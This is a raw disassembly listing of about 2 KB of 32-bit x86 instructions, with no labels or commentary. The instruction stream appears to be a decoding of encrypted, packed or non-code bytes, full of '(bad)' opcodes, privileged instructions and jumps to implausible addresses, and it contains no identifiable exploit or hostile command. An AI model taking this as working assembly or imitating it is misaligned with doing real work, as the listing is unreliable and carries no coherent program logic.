  4101f8:	mov    ebp,0xa7c2b3dc
  4101fd:	ins    DWORD PTR es:[edi],dx
  4101fe:	lds    edx,FWORD PTR [ebx+0x78]
  410201:	adc    al,0x5b
  410203:	fwait
  410204:	and    al,bl
  410206:	pop    ebp
  410207:	popf   
  410208:	rol    DWORD PTR [esi+0x2e],1
  41020b:	sbb    esi,DWORD PTR [edx]
  41020d:	fs inc esp
  41020f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410210:	jb     0x410240
  410212:	jne    0x4101c5
  410214:	je     0x41021d
  410216:	mov    esp,?
  410218:	stos   BYTE PTR es:[edi],al
  410219:	pop    ds
  41021a:	xchg   esp,eax
  41021b:	stc    
  41021c:	xor    DWORD PTR fs:[ecx],0xebb0bd69
  410223:	jne    0x410205
  410225:	(bad)  
  410226:	fwait
  410227:	jne    0x4101cd
  410229:	xchg   edi,eax
  41022a:	mov    ch,0xe8
  41022c:	pop    ss
  41022d:	push   eax
  41022e:	cmp    DWORD PTR [ebx+eiz*8+0x2b3d4153],0x41efd700
  410239:	inc    ebp
  41023a:	iret   
  41023b:	adc    DWORD PTR [ecx-0x2256b6dd],eax
  410241:	pop    ss
  410242:	test   eax,0x872473c7
  410247:	sar    ch,1
  410249:	dec    esp
  41024a:	push   eax
  41024b:	scas   al,BYTE PTR es:[edi]
  41024c:	repz retf 
  41024e:	pop    ecx
  41024f:	xchg   esp,eax
  410250:	adc    edx,edi
  410252:	repnz mov ecx,0x1d7f13a6
  410258:	push   ecx
  410259:	push   es
  41025a:	and    BYTE PTR [ecx+0x4e6429fe],cl
  410260:	pop    ebx
  410261:	rcl    ecx,1
  410263:	aam    0xbf
  410265:	(bad)  
  410266:	or     ebx,edx
  410268:	push   es
  410269:	mov    al,ds:0x57fe40e8
  41026e:	jle    0x410201
  410270:	(bad)  
  410271:	loop   0x410230
  410273:	retf   
  410274:	int3   
  410275:	xor    eax,0x82d110e9
  41027a:	(bad)  
  41027b:	jmp    0x4102e0
  41027d:	lods   al,BYTE PTR ds:[esi]
  41027e:	shl    DWORD PTR [ebp+ebp*4-0x4379d754],0x20
  410286:	sub    al,0x6
  410288:	nop
  410289:	into   
  41028a:	test   al,0x9d
  41028c:	test   edx,esp
  41028e:	xchg   edi,eax
  41028f:	lds    ebp,FWORD PTR [edi]
  410291:	cs sbb al,0x86
  410294:	cli    
  410295:	sahf   
  410296:	xor    al,0x31
  410298:	xchg   esp,eax
  410299:	jg     0x410294
  41029b:	add    al,0x16
  41029d:	sbb    DWORD PTR [edx-0x19],edi
  4102a0:	adc    BYTE PTR [ebx+0x64],dl
  4102a3:	sahf   
  4102a4:	or     esi,edi
  4102a6:	retf   0x374a
  4102a9:	mov    gs,WORD PTR [esi]
  4102ab:	in     eax,dx
  4102ac:	int    0xf
  4102ae:	or     BYTE PTR [ebx-0x1f29400],dl
  4102b4:	cli    
  4102b5:	add    DWORD PTR [ecx],edi
  4102b7:	daa    
  4102b8:	out    0x11,al
  4102ba:	cld    
  4102bb:	ja     0x41027f
  4102bd:	lods   al,BYTE PTR ds:[esi]
  4102be:	in     al,0x86
  4102c0:	pop    ecx
  4102c1:	sub    esp,edx
  4102c3:	cld    
  4102c4:	and    al,bh
  4102c6:	shl    DWORD PTR [eax+0x2],1
  4102c9:	imul   edi,DWORD PTR [esi],0x7dc1bf2d
  4102cf:	ds hlt 
  4102d1:	and    DWORD PTR [ecx],ebp
  4102d3:	cwde   
  4102d4:	ins    DWORD PTR es:[edi],dx
  4102d5:	jge    0x4102c4
  4102d7:	mov    edx,0x3ff1c625
  4102dc:	cdq    
  4102dd:	mov    ds:0x4f39f24c,eax
  4102e2:	retf   
  4102e3:	xchg   ebx,eax
  4102e4:	sub    al,ch
  4102e6:	das    
  4102e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102e8:	dec    edi
  4102e9:	test   eax,0x1ff911fa
  4102ee:	push   edi
  4102ef:	push   esi
  4102f0:	push   esp
  4102f1:	dec    esp
  4102f2:	jl     0x4102f2
  4102f4:	xor    eax,0xc0d657da
  4102f9:	std    
  4102fa:	inc    ebp
  4102fb:	daa    
  4102fc:	or     DWORD PTR [esi],ebx
  4102fe:	mov    esi,0x4f4a10e2
  410303:	pusha  
  410304:	and    eax,0x2abaaea8
  410309:	retf   
  41030a:	popf   
  41030b:	push   0x4d1c06ab
  410310:	aam    0x76
  410312:	aaa    
  410313:	push   ebx
  410314:	xchg   BYTE PTR [esi],cl
  410316:	or     eax,ebp
  410318:	call   0x77c6c04
  41031d:	addr16 mov ebx,0x46f97335
  410323:	mov    edx,0xefbf3556
  410328:	mov    esp,0xbc579a37
  41032d:	daa    
  41032e:	xor    al,0x5a
  410330:	in     eax,0x86
  410332:	sub    eax,0xbb411c72
  410337:	dec    eax
  410338:	dec    ecx
  410339:	lea    eax,[ecx-0x41]
  41033c:	push   0x4c0d8487
  410341:	inc    ebp
  410342:	fisttp QWORD PTR [esi]
  410344:	in     eax,0xa
  410346:	cmc    
  410347:	mov    al,0x97
  410349:	or     DWORD PTR [ebx],0xffffff98
  41034c:	pop    esi
  41034d:	push   ds
  41034e:	adc    DWORD PTR [edi-0x7],esi
  410351:	xor    ebx,0xed058b22
  410357:	in     eax,dx
  410358:	ror    ch,cl
  41035a:	jmp    0x8e55:0xc295850e
  410361:	rcr    DWORD PTR [ebx-0x5a],0xb5
  410365:	pop    esi
  410366:	ins    DWORD PTR es:[edi],dx
  410367:	test   ebp,eax
  410369:	(bad)  
  41036b:	or     al,BYTE PTR [ecx-0x4c]
  41036e:	dec    edx
  41036f:	lea    eax,[esi-0x644778a]
  410375:	jo     0x4103d2
  410377:	pop    ebp
  410378:	ret    
  410379:	loopne 0x41038a
  41037b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41037c:	das    
  41037d:	rcl    BYTE PTR [edx],cl
  41037f:	in     eax,dx
  410380:	mov    ds:0xd938d927,al
  410385:	mov    esp,0x5d974352
  41038a:	dec    edx
  41038b:	add    eax,0x15f077ee
  410390:	push   ebx
  410391:	or     ah,bh
  410393:	test   bl,0x25
  410396:	stc    
  410397:	add    ebp,DWORD PTR [edi+0xf]
  41039a:	jo     0x410334
  41039c:	out    0x7e,al
  41039e:	cmp    BYTE PTR [edx-0x6b],ch
  4103a1:	xchg   edi,eax
  4103a2:	inc    esp
  4103a3:	and    ch,0xd8
  4103a6:	(bad)  
  4103a7:	fwait
  4103a8:	sahf   
  4103a9:	inc    eax
  4103aa:	xlat   BYTE PTR ds:[ebx]
  4103ab:	out    dx,al
  4103ac:	pop    ss
  4103ad:	jl     0x4103a6
  4103af:	test   eax,0xb84d40b1
  4103b4:	daa    
  4103b5:	dec    ecx
  4103b6:	inc    ch
  4103b8:	adc    BYTE PTR [ebx+eax*1+0x50],0x5c
  4103bd:	mov    ah,dh
  4103bf:	in     al,dx
  4103c0:	mov    WORD PTR [esi-0x65],?
  4103c3:	ret    
  4103c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103c5:	jae    0x410390
  4103c7:	mov    DWORD PTR [edi],ebp
  4103c9:	jl     0x410389
  4103cb:	(bad)  
  4103cc:	sub    eax,0xe4e7aa3b
  4103d1:	jge    0x410389
  4103d3:	test   BYTE PTR [ebp+0x64],bl
  4103d6:	dec    edx
  4103d7:	ja     0x41037c
  4103d9:	push   cs
  4103da:	xchg   BYTE PTR [esi+ebx*4],dl
  4103dd:	jne    0x4103cc
  4103df:	xor    edx,esp
  4103e1:	push   esi
  4103e2:	into   
  4103e3:	cmc    
  4103e4:	mov    dh,0xb1
  4103e6:	rol    BYTE PTR [ecx+0x7627e44f],0x7
  4103ed:	mov    eax,ds:0x51efe6a4
  4103f2:	test   DWORD PTR [edx-0x703e83dd],eax
  4103f8:	cld    
  4103f9:	stos   BYTE PTR es:[edi],al
  4103fa:	mov    ch,0xe7
  4103fc:	cmp    eax,DWORD PTR [eax-0x76]
  4103ff:	dec    ecx
  410400:	add    eax,0x80a8c25b
  410405:	aaa    
  410406:	inc    ebx
  410407:	imul   ecx,DWORD PTR [eax+0x79],0xffffffd1
  41040b:	mov    bl,0xec
  41040d:	mov    edx,0x5b40d703
  410412:	sub    al,0x7c
  410414:	lds    ebx,FWORD PTR [edi-0x2118550d]
  41041a:	cmp    BYTE PTR [ebx-0x2b],dl
  41041d:	pushf  
  41041e:	retf   0x57e0
  410421:	sub    bl,dl
  410423:	and    al,BYTE PTR [ebx-0x19]
  410426:	dec    esi
  410427:	stc    
  410428:	lods   al,BYTE PTR ds:[esi]
  410429:	pop    ds
  41042a:	adc    eax,0x2ceffb40
  41042f:	bound  edx,QWORD PTR [ebx+ebx*4-0xb]
  410433:	in     al,0x59
  410435:	add    cl,BYTE PTR [edi]
  410437:	jae    0x410413
  410439:	pop    edx
  41043a:	stos   DWORD PTR es:[edi],eax
  41043b:	out    0x50,al
  41043d:	push   esp
  41043e:	fnstcw WORD PTR [ecx]
  410440:	iret   
  410441:	sub    al,BYTE PTR [ecx-0x10]
  410444:	pop    edx
  410445:	mov    eax,ds:0xc5620a7d
  41044a:	cmp    dl,BYTE PTR [ecx+0xecb67f5]
  410450:	outs   dx,DWORD PTR ds:[esi]
  410451:	out    dx,eax
  410452:	cmp    ah,BYTE PTR [ebp+0x68]
  410455:	mov    cl,BYTE PTR [esp+edi*2]
  410458:	jnp    0x4104c0
  41045a:	(bad)
  41045f:	push   ebx
  410460:	mov    cl,0x43
  410462:	leave  
  410463:	jne    0x410439
  410465:	aad    0xb1
  410467:	mov    ds:0xb4a103d5,eax
  41046c:	mul    BYTE PTR [esi+0x42]
  41046f:	xchg   esi,eax
  410470:	add    BYTE PTR [edi-0x23],ah
  410473:	xlat   BYTE PTR ds:[ebx]
  410474:	retf   0xbf5b
  410477:	ss out dx,al
  410479:	push   es
  41047a:	pop    esi
  41047b:	or     al,0xa7
  41047d:	adc    al,0xf4
  41047f:	mov    edx,0x2c622d87
  410484:	dec    esp
  410485:	pop    ebp
  410486:	sub    DWORD PTR [eax],esi
  410488:	retf   
  410489:	dec    esp
  41048a:	mov    bh,0x81
  41048c:	hlt    
  41048d:	jbe    0x41050a
  41048f:	push   ds
  410490:	add    eax,0x72e1137b
  410495:	test   al,0x19
  410497:	das    
  410498:	pop    ss
  410499:	fwait
  41049a:	adc    dh,BYTE PTR [ebx-0x2c]
  41049d:	dec    ecx
  41049e:	in     eax,dx
  41049f:	scas   al,BYTE PTR es:[edi]
  4104a0:	mov    edi,0x8d2d937b
  4104a5:	fnstsw WORD PTR ds:0xca7ec778
  4104ab:	das    
  4104ac:	push   ds
  4104ad:	popf   
  4104ae:	shr    BYTE PTR [esp+edx*2],0xab
  4104b2:	dec    esp
  4104b3:	popf   
  4104b4:	scas   al,BYTE PTR es:[edi]
  4104b5:	add    eax,DWORD PTR [ebx]
  4104b7:	pop    esi
  4104b8:	scas   al,BYTE PTR es:[edi]
  4104b9:	inc    BYTE PTR [bx+si]
  4104bc:	je     0x410456
  4104be:	xor    al,0x37
  4104c0:	icebp  
  4104c1:	inc    eax
  4104c2:	in     al,dx
  4104c3:	sbb    cl,BYTE PTR [edx+0x3ce5815d]
  4104c9:	pop    edi
  4104ca:	in     al,dx
  4104cb:	icebp  
  4104cc:	popa   
  4104cd:	mov    al,ds:0x84d2a873
  4104d2:	fstp   QWORD PTR [eax]
  4104d4:	hlt    
  4104d5:	and    eax,0x7b1b3c9e
  4104da:	call   0xefb8:0x582992cf
  4104e1:	jns    0x4104f1
  4104e3:	psllq  mm1,QWORD PTR [edi]
  4104e6:	scas   al,BYTE PTR es:[edi]
  4104e7:	add    DWORD PTR [ebx-0x29],0x9579866f
  4104ee:	jb     0x410500
  4104f0:	dec    ebx
  4104f1:	cmp    eax,0xe4360e8c
  4104f6:	sub    BYTE PTR [ebx+0x411bd0f9],dl
  4104fc:	xchg   esp,eax
  4104fd:	test   bl,ch
  4104ff:	imul   ebx,DWORD PTR [edi+0x40783d6a],0x19
  410506:	sbb    bh,BYTE PTR [ebx]
  410508:	jl     0x41052e
  41050a:	or     DWORD PTR [ebx],edi
  41050c:	push   eax
  41050d:	ret    0xac86
  410510:	and    BYTE PTR [esi],0x13
  410513:	popf   
  410514:	popa   
  410515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410516:	ja     0x41049c
  410518:	pushf  
  410519:	(bad)
  41051d:	xor    al,0xd8
  41051f:	into   
  410520:	in     eax,dx
  410521:	mov    edx,0xf3327208
  410526:	aas    
  410527:	in     eax,0xce
  410529:	sub    bl,BYTE PTR [eax]
  41052b:	addr16 out dx,eax
  41052d:	iret   
  41052e:	mov    al,0xd6
  410530:	mov    WORD PTR [ebp+0x42],es
  410533:	jl     0x4104d9
  410535:	sti    
  410536:	jb     0x41055f
  410538:	inc    ebx
  410539:	lds    edx,FWORD PTR [edi-0x13]
  41053c:	or     DWORD PTR [ebp+0x5f],ebp
  41053f:	fsub   DWORD PTR [ecx+0x27]
  410542:	push   edi
  410543:	add    ecx,edx
  410545:	mov    ch,0xf5
  410547:	jae    0x4104cb
  410549:	pop    ebp
  41054a:	pop    ebx
  41054b:	push   cs
  41054c:	nop
  41054d:	jne    0x410507
  41054f:	scas   eax,DWORD PTR es:[edi]
  410550:	lods   eax,DWORD PTR ds:[esi]
  410551:	popf   
  410552:	enter  0x42c2,0xfc
  410556:	cmp    eax,0x8d93678e
  41055b:	jge    0x410546
  41055d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41055e:	cmc    
  41055f:	rol    DWORD PTR [ebp+0x56d848b4],cl
  410565:	sbb    DWORD PTR [eax],0x45
  410568:	scas   eax,DWORD PTR es:[edi]
  410569:	sbb    eax,edi
  41056b:	aad    0x80
  41056d:	sti    
  41056e:	mov    cl,0xe6
  410570:	loope  0x4105dc
  410572:	mov    edi,0xdf7e5390
  410577:	xchg   esi,eax
  410578:	dec    edx
  410579:	mov    ebp,0x9847473
  41057e:	pusha  
  41057f:	popa   
  410580:	sahf   
  410581:	ret    0x7791
  410584:	pusha  
  410585:	retf   
  410586:	loopne 0x410526
  410588:	call   0x8adc:0xd901667b
  41058f:	or     ecx,esp
  410591:	mov    DWORD PTR [ebx],edi
  410593:	inc    sp
  410595:	and    BYTE PTR [ebp+0x6b],ch
  410598:	jb     0x410526
  41059a:	mov    BYTE PTR [ebx+ebx*1],0x93
  41059e:	mov    ebx,0x6a7d3ad9
  4105a3:	cdq    
  4105a4:	and    bh,ch
  4105a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105a7:	repz pop ebx
  4105a9:	clc    
  4105aa:	push   es
  4105ab:	inc    DWORD PTR [eax+eiz*2]
  4105ae:	jp     0x41062e
  4105b0:	icebp  
  4105b1:	jge    0x410601
  4105b3:	ins    BYTE PTR es:[edi],dx
  4105b4:	arpl   WORD PTR [ebx-0x5c],di
  4105b7:	fadd   st,st(3)
  4105b9:	(bad)  
  4105ba:	mov    ch,0x3c
  4105bc:	xor    bl,dl
  4105be:	mov    ds:0x117514fd,eax
  4105c3:	lods   eax,DWORD PTR ds:[esi]
  4105c4:	(bad)  
  4105c5:	nop    ebx
  4105c8:	cmp    DWORD PTR [esi+0x6d],esp
  4105cb:	ret    0xa4bb
  4105ce:	jge    0x410641
  4105d0:	dec    esi
  4105d1:	xacquire xchg BYTE PTR [ebp-0x19e71a73],ch
  4105d8:	mov    ch,BYTE PTR [ebp+0x2f]
  4105db:	adc    DWORD PTR [esi+0x65],0xffffffae
  4105df:	push   esp
  4105e0:	leave  
  4105e1:	push   ss
  4105e2:	add    eax,0xee3b580a
  4105e7:	mov    esp,0x27a434ab
  4105ec:	test   BYTE PTR [edx],bl
  4105ee:	mov    bl,ah
  4105f0:	pop    ss
  4105f1:	jne    0x410622
  4105f3:	aad    0xd2
  4105f5:	mov    al,ds:0x5eaa406e
  4105fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105fb:	(bad)  
  4105fc:	nop
  4105fd:	scas   eax,DWORD PTR es:[edi]
  4105fe:	cdq    
  4105ff:	push   ebp
  410600:	jp     0x410640
  410602:	jns    0x41058f
  410604:	shl    DWORD PTR [ebx+0x4e8c88b],0xe4
  41060b:	sbb    eax,0x834ed9e2
  410610:	push   ds
  410611:	cmc    
  410612:	in     eax,dx
  410613:	pop    esp
  410614:	xchg   edx,eax
  410615:	mov    WORD PTR [ebp+0xa],es
  410618:	mov    edx,0x2a8572ef
  41061d:	popa   
  41061e:	lahf   
  41061f:	nop
  410620:	cmp    eax,0xf6c2cab9
  410625:	jae    0x4105a7
  410627:	fistp  WORD PTR [edx+ebp*4-0x5064ba3c]
  41062e:	xchg   esp,eax
  41062f:	and    DWORD PTR [edi+0x7780c836],0x58987c30
  410639:	adc    BYTE PTR [esi+ecx*8+0x3973d8a0],0x37
  410641:	mov    esi,gs
  410643:	sbb    esp,eax
  410645:	retf   
  410646:	cmp    esp,DWORD PTR ds:0x42a43c8a
  41064c:	test   eax,ecx
  41064e:	inc    ecx
  41064f:	sbb    bl,BYTE PTR [ebx]
  410651:	jmp    0xddd53e18
  410656:	cmova  esp,DWORD PTR [eax+0x2b]
  41065a:	jnp    0x410602
  41065c:	fld    QWORD PTR [esp+edx*1+0x1c]
  410660:	sbb    BYTE PTR [esi],bh
  410662:	das    
  410663:	imul   ebx,DWORD PTR [eax-0x7798f828],0x7a
  41066a:	shl    DWORD PTR ds:0x5c7cb719,cl
  410670:	outs   dx,DWORD PTR ds:[esi]
  410671:	jle    0x4106b2
  410673:	pop    eax
  410674:	retf   0x305a
  410677:	mov    dh,BYTE PTR [edx-0x45]
  41067a:	cmp    BYTE PTR [eax+0x52307bf4],0x8
  410681:	jg     0x41065d
  410683:	push   eax
  410684:	iret   
  410685:	lods   eax,DWORD PTR ds:[esi]
  410686:	lock and ah,BYTE PTR [edi]
  410689:	in     eax,0x59
  41068b:	mov    ds:0xe536e05f,al
  410690:	dec    esp
  410691:	das    
  410692:	inc    esp
  410693:	xor    ecx,edx
  410695:	inc    ecx
  410696:	dec    esi
  410697:	jo     0x410643
  410699:	in     eax,dx
  41069a:	sub    bl,BYTE PTR [edi]
  41069c:	or     eax,DWORD PTR [eax-0x454f7cbb]
  4106a2:	push   0x748588b7
  4106a7:	sub    eax,0x2f867e24
  4106ac:	std    
  4106ad:	push   es
  4106ae:	inc    esi
  4106af:	pushf  
  4106b0:	cmp    eax,0xc78e31fb
  4106b5:	mov    DWORD PTR [ebx+ebp*4-0x5f],edx
  4106b9:	jmp    FWORD PTR [ebx-0x39]
  4106bc:	inc    esp
  4106bd:	into   
  4106be:	jbe    0x4106cb
  4106c0:	xor    BYTE PTR [esi],dl
  4106c2:	mov    eax,DWORD PTR [eiz*4+0x38cb64f8]
  4106c9:	xchg   esp,eax
  4106ca:	jg     0x410668
  4106cc:	pop    ss
  4106cd:	or     al,BYTE PTR [ebp+0x4f]
  4106d0:	pop    esi
  4106d1:	sbb    eax,0x97baedac
  4106d6:	dec    DWORD PTR [edx-0x23]
  4106d9:	out    dx,eax
  4106da:	lods   al,BYTE PTR ds:[esi]
  4106db:	push   ecx
  4106dc:	dec    eax
  4106dd:	lods   eax,DWORD PTR ds:[esi]
  4106de:	ss adc al,0xd
  4106e1:	push   ds
  4106e2:	xor    BYTE PTR [eax],bh
  4106e4:	(bad)  
  4106e5:	sbb    al,0xb9
  4106e7:	and    BYTE PTR [ecx-0x1cba7b23],ah
  4106ed:	push   es
  4106ee:	call   0x450800c3
  4106f3:	cmp    eax,0x20d0ceac
  4106f8:	loope  0x4106e3
  4106fa:	mov    al,ds:0xf83e03fa
  4106ff:	sbb    ah,cl
  410701:	mov    fs,WORD PTR [ebp-0x3b]
  410704:	push   ds
  410705:	adc    BYTE PTR [esp+ebx*8+0x2208b611],cl
  41070c:	scas   al,BYTE PTR es:[edi]
  41070d:	cwde   
  41070e:	cmc    
  41070f:	sar    BYTE PTR [esi],0xb3
  410712:	inc    edx
  410713:	icebp  
  410714:	dec    ecx
  410715:	mov    BYTE PTR ds:0xa2ae2cc7,al
  41071b:	mov    al,ds:0xd3174782
  410720:	aas    
  410721:	lods   al,BYTE PTR ds:[esi]
  410722:	cmp    edi,DWORD PTR [esi]
  410724:	xchg   ecx,eax
  410725:	cmp    BYTE PTR [esp+edx*4],ah
  410728:	scas   al,BYTE PTR es:[edi]
  410729:	sbb    ebx,edi
  41072b:	lidtd  [ebp-0x5d375dcb]
  410732:	test   al,0x83
  410734:	ret    
  410735:	xor    dh,bl
  410737:	mov    ah,ah
  410739:	sahf   
  41073a:	pop    esi
  41073b:	cmp    al,0xb7
  41073d:	ds ja  0x410752
  410740:	(bad)  
  410742:	test   BYTE PTR [edx-0x2b],bh
  410745:	jecxz  0x410761
  410747:	mov    ?,ebx
  410749:	mov    dl,0x7b
  41074b:	fst    QWORD PTR [ebp+0x61]
  41074e:	imul   ebx,DWORD PTR [esi],0xffffffb6
  410751:	das    
  410752:	push   ds
  410753:	les    edi,FWORD PTR [edx-0x63f08f25]
  410759:	push   ecx
  41075a:	mov    eax,0xbae01e32
  41075f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410760:	jo     0x4106ea
  410762:	cli    
  410763:	mov    bl,0xdf
  410765:	adc    eax,0x67de31f7
  41076a:	jp     0x4107b1
  41076c:	dec    edi
  41076d:	cmp    DWORD PTR [esi+edi*2-0x55],edx
  410771:	or     bl,BYTE PTR [ebx]
  410773:	fcmovu st,st(3)
  410775:	mov    edi,0xd68b03f0
  41077a:	aad    0x25
  41077c:	les    edx,FWORD PTR [edx]
  41077e:	dec    edi
  41077f:	(bad)  
  410780:	js     0x41070b
  410782:	or     dl,BYTE PTR [edi-0x24]
  410785:	mov    ah,0xe8
  410787:	ss fwait
  410789:	jnp    0x410751
  41078b:	add    BYTE PTR [edx-0x3e4f9e05],bh
  410791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410792:	pop    es
  410793:	fiadd  WORD PTR [esi+0x1188bdb4]
  410799:	rol    DWORD PTR [ebp-0x30],cl
  41079c:	mov    dl,0x7b
  41079e:	jo     0x410779
  4107a0:	ins    DWORD PTR es:[edi],dx
  4107a1:	mov    bl,0xf
  4107a3:	or     esi,DWORD PTR [esi]
  4107a5:	ins    BYTE PTR es:[edi],dx
  4107a6:	ja     0x4107a9
  4107a8:	mov    dl,BYTE PTR [ebx+0x6ca246f3]
  4107ae:	repnz or bl,BYTE PTR [ebx+0x24]
  4107b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107b3:	push   0xffffffd1
  4107b5:	loop   0x410756
  4107b7:	dec    edx
  4107b8:	and    eax,0xa7762468
  4107bd:	in     eax,0x16
  4107bf:	imul   eax,edi,0x13608bcc
  4107c5:	dec    ebp
  4107c6:	jmp    0x9347e0e9
  4107cb:	push   ds
  4107cc:	call   0x6934968c
  4107d1:	xor    eax,0x77061500
  4107d6:	bound  edi,QWORD PTR [edx-0x48]
  4107d9:	daa    
  4107da:	adc    bl,BYTE PTR [esi+0x661d9adc]
  4107e0:	mov    BYTE PTR [eax+0x7bb37e8e],ch
  4107e6:	xchg   esp,eax
  4107e7:	mov    edi,0x5ce1c3b1
  4107ec:	jp     0x4107b7
  4107ee:	sbb    al,BYTE PTR [ebx+0x298ae7ff]
  4107f4:	sbb    edi,DWORD PTR [edi]
  4107f6:	mov    BYTE PTR [ebp-0x2dfb5f5e],cl
  4107fc:	jle    0x41086b
  4107fe:	xchg   edx,eax
  4107ff:	pusha  
  410800:	int3   
  410801:	xchg   ebx,eax
  410802:	mov    edx,0x6dcfc1c8
  410807:	jp     0x4107f3
  410809:	call   0x93e9c90b
  41080e:	fwait
  41080f:	and    DWORD PTR [esi+ebx*1],esi
  410812:	enter  0x48cc,0x8f
  410816:	fcomi  st,st(7)
  410818:	xor    eax,0xf2c83472
  41081d:	scas   eax,DWORD PTR es:[edi]
  41081e:	das    
  41081f:	pop    edx
  410820:	fistp  QWORD PTR [ebp-0x4625bfa]
  410826:	fnsave [ebx]
  410828:	rol    DWORD PTR [ebp+0x2b1b2169],0xc0
  41082f:	(bad)  
  410830:	cwde   
  410831:	cmp    eax,0x1498f948
  410836:	fist   DWORD PTR [edx]
  410838:	or     DWORD PTR [edi+eiz*4-0x2c9f8ed6],ebp
  41083f:	mov    al,ds:0x392bedf1
  410844:	in     eax,0xa9
  410846:	pop    ebp
  410847:	lock pause 
  41084a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41084b:	mov    edi,0xb11da62f
  410850:	jne    0x41086b
  410852:	std    
  410853:	mov    ds:0xa5905d4e,al
  410858:	push   0x9617fa2f
  41085d:	call   0x511130a4
  410862:	cmp    eax,0x4d9207df
  410867:	sub    eax,edx
  410869:	jmp    0xe851af2e
  41086e:	mov    al,cl
  410870:	loop   0x410890
  410872:	cld    
  410873:	(bad)  
  410874:	sbb    al,BYTE PTR [edi]
  410876:	lods   al,BYTE PTR ds:[esi]
  410877:	jo     0x4108d8
  410879:	adc    BYTE PTR [edx],0xa7
  41087c:	jp     0x41087e
  41087e:	(bad)  [edi-0x32]
  410881:	pop    ss
  410882:	add    esp,esp
  410884:	addr16 cli 
  410886:	inc    ecx
  410887:	adc    DWORD PTR [edi+edx*2+0x6c],edx
  41088b:	test   eax,0xb374cab1
  410890:	mov    eax,ds:0x369c0f1a
  410895:	outs   dx,DWORD PTR ds:[esi]
  410896:	bound  edx,QWORD PTR [ebp-0x3f4fb790]
  41089c:	outs   dx,BYTE PTR ds:[esi]
  41089d:	cmp    eax,0x5817763
  4108a2:	xchg   ecx,eax
  4108a3:	xor    al,0x2
  4108a5:	jmp    DWORD PTR [edi+0x2397fc00]
  4108ab:	and    DWORD PTR ds:0xe6508c30,edi
  4108b1:	cmp    ah,bh
  4108b3:	add    bl,ch
  4108b5:	fidivr WORD PTR [ecx+0x15]
  4108b8:	(bad)  [ebp-0x3f]
  4108bb:	jnp    0x410846
  4108bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108be:	cmc    
  4108bf:	and    al,0xa6
  4108c1:	scas   eax,DWORD PTR es:[edi]
  4108c2:	push   ebp
  4108c3:	lea    ecx,[edi-0x1076aebe]
  4108c9:	int    0xe2
  4108cb:	repz sub al,0xc8
  4108ce:	push   esp
  4108cf:	mov    ss,edi
  4108d1:	mov    edx,?
  4108d3:	mov    al,ds:0x12a8efe
  4108d8:	(bad)  
  4108d9:	rcr    ch,cl
  4108db:	pop    esp
  4108dc:	push   edi
  4108dd:	cli    
  4108de:	sub    DWORD PTR [eax-0x58],ecx
  4108e1:	pop    ebp
  4108e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108e3:	out    0x37,al
  4108e5:	fucom  st(0)
  4108e7:	sub    ecx,edx
  4108e9:	repnz (bad) 
  4108eb:	dec    edi
  4108ec:	mov    al,ds:0x29e55293
  4108f1:	lea    ecx,[ecx+ebx*2-0x13]
  4108f5:	add    al,0xf5
  4108f7:	es sbb al,0xe1
  4108fa:	mov    BYTE PTR [esi-0x669b0e0b],ch
  410900:	xchg   esp,eax
  410901:	repz push edi
  410903:	cli    
  410904:	imul   DWORD PTR [ecx-0x4c]
  410907:	mov    bh,0x67
  410909:	jae    0x41092c
  41090b:	xchg   esp,eax
  41090c:	inc    ebx
  41090d:	stos   DWORD PTR es:[edi],eax
  41090e:	(bad)  
  41090f:	cmp    al,0x2f
  410911:	aas    
  410912:	je     0x4108ae
  410914:	push   esi
  410915:	(bad)  
  410916:	cmp    al,0x42
  410918:	xchg   BYTE PTR ss:[eax],dh
  41091b:	pop    es
  41091c:	mov    ebx,0x29cf0e21
  410921:	jmp    0x1119:0xb076a535
  410928:	fst    QWORD PTR [ebp+0xadb588f]
  41092e:	popa   
  41092f:	or     al,0x6c
  410931:	out    dx,al
  410932:	dec    edx
  410933:	outs   dx,DWORD PTR ds:[esi]
  410934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410935:	sub    edi,DWORD PTR [eax-0x3fe2b805]
  41093b:	in     eax,dx
  41093c:	mov    ah,0x75
  41093e:	or     eax,0x2905c723
  410943:	pop    ebp
  410944:	rol    BYTE PTR [ebp+0x7c18f925],1
  41094a:	dec    ebx
  41094b:	and    edi,edi
  41094d:	sbb    BYTE PTR [esp+eiz*8],cl
  410950:	sar    BYTE PTR [ebp+ebp*2+0x74fd37ef],cl
  410957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410958:	ss dec esi
  41095a:	es ja  0x4109c0
  41095d:	add    edi,DWORD PTR [eax+0x15]
  410960:	cwde   
  410961:	mov    edi,fs
  410963:	push   ss
  410964:	push   edi
  410965:	ret    0xa794
  410968:	test   al,0xe6
  41096a:	fcmovbe st,st(5)
  41096c:	xchg   esi,eax
  41096d:	push   ecx
  41096e:	adc    ch,BYTE PTR [ebx+0x3e7945bf]
  410974:	fisttp WORD PTR [edi-0x5dbda3fe]
  41097a:	fsave  [edx]
  41097d:	je     0x410936
  41097f:	adc    al,bh
  410981:	add    eax,0xcc239ee
  410986:	mov    ds:0x28313348,al
  41098b:	call   0x84b27dfe
  410990:	xor    al,0xb8
  410992:	scas   al,BYTE PTR es:[edi]
  410993:	icebp  
  410994:	sub    eax,0x5c4ca1ee
  410999:	std    
  41099a:	pop    ss
  41099b:	mov    dl,0x8d
  41099d:	sub    al,0x8
  41099f:	sbb    BYTE PTR [ebp-0x48],bh
  4109a2:	pop    esp
  4109a3:	idiv   DWORD PTR [esi-0x12]
  4109a6:	sbb    DWORD PTR [eax],ebp
  4109a8:	mov    esi,0x1aeeb3b1
  4109ad:	ret    
  4109ae:	out    dx,al
  4109af:	pop    esp
